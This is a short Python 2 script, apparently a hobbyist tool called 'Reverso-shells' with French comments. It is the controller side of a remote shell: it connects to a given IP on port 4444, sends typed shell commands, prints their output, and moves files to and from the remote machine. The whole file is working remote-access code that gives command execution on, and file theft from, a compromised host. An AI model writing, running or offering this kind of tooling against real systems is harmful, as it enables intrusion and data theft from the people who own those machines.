import socket
import os
import time

##FUNCTIONS
def banner():
	print " ________________ "
	print "< Reverso-shells >"
	print "By Koploseus"
	print " ---------------- "
	print "   \ "
	print "    \ "
	print "        .--."
	print "       |o_o |"
	print "       |:_/ |"
	print "      //   \ \ "
	print "     (|     | )"
	print "    /'\_   _/`\ "
	print "    \___)=(___/"
	print " "
	print " "


def recieveLine(socket):
    """
    retourne ligne en attente
    @return a string recieve line
    """
    data = ""
    line = ""
    while(data != '\n'):
        line  += data
        data = socket.recv(1)
        if not data:
            print "Connexion perdu\n"
            exit(0)
    return line

def uploadFile(socket,filename):
    f = open(filename,'r')
    socket.send(f.name + "\n")
    size = os.path.getsize(filename)
    socket.send(str(size) + "\n")
    data = f.read(1024)
    while (data):
        socket.send(data)
        data = f.read(1024)
    print "Upload Reussi !\n"

def downloadFile(socket):
    if(recieveLine(socket) == "NONREADABLE"):
        print "Error Permssion Denied"
        return
    filename = recieveLine(socket)
    f = open(filename, 'w')
    size = int(recieveLine(socket))
    while size != 0:
        data = socket.recv(1024)
        f.write(data)
        size -= len(data)
    print "Download Reussi !\n"


#FIN FUNCTION
os.system("clear")
banner()


host = raw_input("IP: ")
port = 4444

 #Creation socket AF_INET

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try: # test connexion
    server.connect((host, port))
    print "[+] Connexion en cours..."
    time.sleep(2)
    print "[+] Connexion reussi!\n\n"
except socket.error:
    print "[-]Erreur! Serveur non joignable !!!\n "
    exit(0)

cmd = ""

# Lis les commandes et les envois
while cmd != 'exit':

    cmd = raw_input("shell-#")

    if(cmd[:6] == "upload"):
        t = cmd.split(" ")
        if not os.access(t[1],os.R_OK):
            print "Permission Denied"
            continue
        server.send(cmd + "\n")
        uploadFile(server,t[1])
        continue

    elif(cmd[:8] == "download"):
        server.send(cmd + "\n")
        downloadFile(server)
        continue

    server.send(cmd + "\n")     # envoie la commande au serveur

    numoflines = recieveLine(server)

    for i in range(int(numoflines)):
        print(recieveLine(server))


server.close()
